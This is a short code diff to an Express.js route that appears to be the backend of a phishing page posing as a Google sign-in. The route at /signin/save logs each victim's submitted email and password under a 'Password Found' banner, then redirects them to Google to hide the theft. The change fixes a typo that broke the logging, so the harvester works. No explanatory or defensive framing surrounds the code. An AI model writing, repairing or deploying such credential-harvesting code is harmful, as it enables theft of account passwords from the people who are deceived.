@@ -15,7 +15,7 @@ router.get('/', function (req, res, next) {
 router.post('/signin/save', function (req, res, next) {
 
   console.log("=======Password Found=========")
-  onsole.log(req.body.hidEmail);
+  console.log(req.body.hidEmail);
   console.log(req.body.Passwd);
   res.redirect('https://www.google.co.in');
 });
